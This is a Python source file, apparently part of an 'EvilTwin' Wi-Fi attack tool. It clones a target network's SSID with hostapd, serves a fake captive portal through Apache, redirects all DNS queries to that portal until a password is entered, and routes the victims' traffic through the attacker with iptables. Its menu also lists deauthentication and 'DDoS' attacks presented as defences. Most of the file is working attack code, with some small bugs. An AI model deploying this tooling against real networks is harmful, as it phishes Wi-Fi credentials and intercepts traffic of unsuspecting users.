from operator import sub
from rich.console import Console
from prompt_toolkit import prompt
from prompt_toolkit.shortcuts import ProgressBar
import time
import subprocess
import os
import shlex

console = Console()


def defence_menu_io() -> str:
    console.print('[bold]Please choose the desired [blue]Defence[/]: \n\
    0. Scans for two SSIDs with the same name and the disconnects them from the network by using Dauth \n\
    1. Counts the deauth packets and when exceeds a certain value    TODO     \n\
    3. Scans for two SSIDs with the same name and then does a broad DDoS attack on both of them \n\
    0. Exit program[/]\n')
    user_input = prompt('>> ')
    return user_input


def progress_bar(unit: int):
    """
    Simple progress bar to beutify the outputs, will print relatively to 0.001 seconds
    """
    with ProgressBar() as pb:
        for _ in pb(range(unit)):
            time.sleep(.01)


def cleanup(virtual_iner_name: str):
    """
    Post excution cleanup, revert all changes to network tools and configurations
    This is needed to also prepare a new attack
    """
    with open('./shell/cleanup.sh', "w") as file:
        file.write(f'#!/bin/sh\n')
        file.write('airmon-ng check kill\n')
        file.write(f'service hostapd stop\n')
        file.write(f'service apache2 stop\n')
        file.write(f'service dnsmasq stop\n')
        file.write(f'service rpcbind stop\n')
        file.write(f'killall dnsmasq\n')
        file.write(f'killall hostapd\n')
        file.write(f'sudo iw dev {virtual_iner_name} interface del\n')
        file.write(f'service NetworkManager restart\n')
    subprocess.run('bash shell/cleanup.sh', check=True, shell=True)
    console.print(f'[bold][yellow]Cleaning up[/][/]')
    progress_bar(400)


def set_new_virtual_inet(inet_name: str):
    """
    Create a new virtual network interface over the existing monitor one
    This is required to use the same network device from multiple processess
    """
    console.print(f'[bold][yellow]Setting new network interface {inet_name + "mon"}[/][/]')
    subprocess.run(f'iw dev {inet_name} interface add {inet_name+"mon"} type monitor', check=True, shell=True)


def set_apache_serv():
    """
    Sets up the Apache2 web server settings
    we copy settings from desktop and mobile phones alike
    """
    console.print(f'[bold][yellow]Setting up Apache2 webserver[/][/]')
    subprocess.run('cp portal/. /var/www/html -r', check=True, shell=True)
    subprocess.run('chmod 777 /var/www/html/*', check=True, shell=True)
    subprocess.run('cat config/apache/000-default.conf > /etc/apache2/sites-available/000-default.conf', check=True, shell=True)
    subprocess.run('cat config/apache/000-default.conf > /etc/apache2/sites-enabled/000-default.conf', check=True, shell=True)
    subprocess.run('cat config/apache/android.conf > /etc/apache2/sites-enabled/android.conf', check=True, shell=True)
    subprocess.run('a2enmod rewrite', check=True, shell=True)
    subprocess.run('systemctl restart apache2', check=True, shell=True)
    subprocess.run('service apache2 start', check=True, shell=True)
    progress_bar(100)
    console.print(f'[bold][green]Apache server was set successfuly\n\n[/][/]')
    time.sleep(2)


def set_hostapd_conf(attack_inet: str, ssid: str, channel: str):
    """
    Sets hostapd rouge access point setting, the full documentation for each setting 
    is in the docs folder
    """
    with open('./config/hostapd.conf', "w") as file:
        file.write(f'interface={attack_inet}\n')
        file.write('driver=nl80211\n')
        file.write(f'ssid={ssid}\n')
        file.write('hw_mode=g\n')
        file.write(f'channel={channel}\n')
        #macaddr_acl=0 means the Access Control List will accept
        # #everything unless it's specifically in the deny list.
        file.write('macaddr_acl=0\n')
        file.write('ignore_broadcast_ssid=0n')
        

def default_dnsmasq_conf(file, attack_inet: str):
    """
    This is the default DNS masq conf, it doesn't use locking for a captive portal
    because this is a setting we are going to change after we detect a user has entered 
    any password as input
    """
    file.write(f'interface={attack_inet}\n')
    file.write("dhcp-range=10.100.101.2, 10.100.101.30, 255.255.255.0, 12h\n")
    file.write("dhcp-option=3,10.100.101.1 \n")
    file.write("dhcp-option=6,10.100.101.1 \n")
    file.write("server=8.8.8.8\n")
    file.write("log-queries\n")
    file.write("log-dhcp\n")
    file.write("listen-address=127.0.0.1\n")
    file.write("clear-on-reload\n")


def create_dnsconf_captive(attack_inet: str):
    """
    Inserts the captive line to the DNSMASQ settings
    this will force any DNS request to our default gatewaty
    which is the apache2 servers index.html
    """
    with open('./config/dns.conf', "w") as file:
        default_dnsmasq_conf(file, attack_inet)
        #ip to captive portal
        file.write("address=/#/10.100.101.1")
        
#after getting pass in captive portal
def overwrite_dnsconf(attack_inet):
    with open('./config/dns.conf', "w") as file:
        default_dnsmasq_conf(file, attack_inet)


def main_menu_io() -> str:
    console.print('[bold]Please choose the desired option [blue]number[/]: \n\
    1. Set network interface \n\
    2. Start network scan \n\
    3. Initiate EvilTwin attack \n\
    8. Defensive Mechanism \n\
    9. Install Requirements \n\
    0. Exit program[/]\n')
    user_input = prompt('>> ')
    return user_input


def set_netmask(inet_name):
    """
    sudo ifconfig wlan1 up 10.100.101.1 netmask 255.255.255.0
    sudo route add -net 10.100.101.0 netmask 255.255.255.0 gw 10.100.101.1
    sudo ip link set wlan1 up
    """
    console.print(f'[bold][yellow]Setting network interface netmast range[/][/]')
    try:
        subprocess.run(f'ifconfig {inet_name} up 10.100.101.1 netmask 255.255.255.0', check = True, shell=True)
        subprocess.run(shlex.split('route add -net 10.100.101.0 netmask 255.255.255.0 gw 10.100.101.1'), check = True)
        subprocess.run(f'ip link set {inet_name} up', check = True, shell=True)
        progress_bar(100)
    except subprocess.CalledProcessError as e:
        console.print(f'[bold][red]Error Setting netmast[/][/]')
        console.print(e.output)
    else:
        console.print(f'[bold][green]Successfuly set netmast\n\n[/][/]')
        time.sleep(2)


def set_iptables(attack_inet, internet_inet):
    console.print(f'[bold][yellow]Setting iptables routing for Rouge access point[/][/]')
    try:
        subprocess.run(f'iptables --table nat --append POSTROUTING --out-interface {internet_inet} -j MASQUERADE', check = True, shell=True)
        subprocess.run(f'iptables --append FORWARD --in-interface {attack_inet} -j ACCEPT', check = True, shell=True)
       #echo 1 is for forward
        subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', check = True, shell=True)
        progress_bar(100)
    except subprocess.CalledProcessError as e:
        console.print(f'[bold][red]Error Setting iptables[/][/]')
        console.print(e.output)
    else:
        console.print(f'[bold][green]Successfuly set iptables routing for Rouge acces point\n\n[/][/]')
        time.sleep(2)


def set_inet_unmanaged(inet_name):
    #unmanaged to NetWorkManager to prevent problem
    console.print(f'[bold][yellow]Setting network interface {inet_name} to unmanaged by NetworkManager[/][/]')
    try:
        #to prevent to computer from exit of monitor mode
        subprocess.run('echo "[keyfile]" > /etc/NetworkManager/conf.d/99-unmanaged-devices.conf', check = True, shell=True)
        subprocess.run('echo "unmanaged-devices=interface-name:{inet_name}" >> /etc/NetworkManager/conf.d/99-unmanaged-devices.conf', check = True, shell=True)
    except subprocess.CalledProcessError as e:
        console.print(f'[bold][red]Error Setting network interface {inet_name} to unmanaged[/][/]')
        console.print(e.output)
    else:
        console.print(f'[bold][green]Successfuly set network interface {inet_name} to unmanaged[/][/]')
    console.print(f'[bold][yellow]Restarting NetworkManager service for changes to take effect[/][/]')
    try:
        subprocess.run(shlex.split('service NetworkManager restart'), check = True)
        progress_bar(1000)
    except subprocess.CalledProcessError as e:
        console.print(f'[bold][red]Error reatsrting NetworkManager[/][/]')
        console.print(e.output)
    else:
        console.print(f'[bold][green]Successfully restarted NetworkManager service[/][/]')
        time.sleep(2)


def attack_inet_set():
    os.system('clear')
    console.print('[bold]Please insert the exact desired network interface [blue]name[/] for attacking : \n\
[red]Note: Interface must be set to Monitor mode for injection[/] \nif it\'s not we will set it for you :wink:  \n')
    os.system('iwconfig')
    net_interface = prompt('>> ')
    return net_interface


def internet_inet_set():
    os.system('clear')
    console.print('[bold]Now please choose the network interface [blue]name[/] for internet access: \n\
[red]Note: This interface will be used for enabling intert access over the rouge access point[/] \n')
    os.system('ifconfig')
    net_interface = prompt('>> ')
    return net_interface


def set_inet_to_monitor(inet_name):
    console.print(f'[bold][yellow]Setting network interface {inet_name} to monitor mode[/][/]')
    try:
        #monitor on
        subprocess.run(f'ifconfig {inet_name} down', check = True, shell=True)
        subprocess.run(f'iwconfig {inet_name} mode monitor', check = True, shell=True)
        subprocess.run(f'ifconfig {inet_name} up', check = True, shell=True)
        progress_bar(100)
    except subprocess.CalledProcessError as e:
        console.print('[bold][red]Error while trying to set network interface to monitor more[/][/]')
        console.print(e.output)
    else:
        console.print('[bold][green]Network interface was successfuly set to monitor mode\n[/][/]')
        time.sleep(2)


def config_rouge_ap(ssid, inet, channel):
    """
    Creates a configuration file for the rouge access point with the next settings
    will be used with the hostapd command:
    https://wiki.gentoo.org/wiki/Hostapd

        **interface = The network interface we will use for this connection (the one that was
        previously set to monitor mode and used to the attack)
        **driver =  Nl80211 is a public 802.11 network driver docs:
        https://wireless.wiki.kernel.org/en/developers/documentation/nl80211
        **ssid = The network name
        **hw_mode = (Hardware Mode) Sets the 802.11 protocol to be used, doc about the various protocols 
        (we will set is to g): https://en.wikipedia.org/wiki/IEEE_802.11#Protocol
        **channel = Sets the channel for hostapd to work. (From 1 to 13)
        **macaddr_acl = Mac address filter (0 - off, 1 - on)
        **ign_broadcast_ssid = Sets hiddes AP mode on/off
        **auth_algs = Sets the authentication algorithm (0 - open, 1 - shared)
        **wpa = wpa version
        **wpa_passphrase = Sets wireless password
    """
    with open('shell/ap.config', 'w') as f:
        f.write(f'interface={inet}\n')
        f.write('driver=nl80211\n')
        f.write(f'ssid={ssid}\n')
        f.write('hw_mode=g\n')
        f.write(f'channel={channel}\n')
        # f.write('macaddr_acl=0')
        # f.write('ignore_broadcast_ssid=0')
        # f.write('auth_algs=1')
        # f.write('wpa=2')
        # f.write('wpa_passphrase=shooshool')
        #  wpa_key_mgmt=WPA-PSK
        #  wpa_pairwise=CCMP
        #  wpa_group_rekey=86400
        #  ieee80211n=1
        #  wme_enabled=1
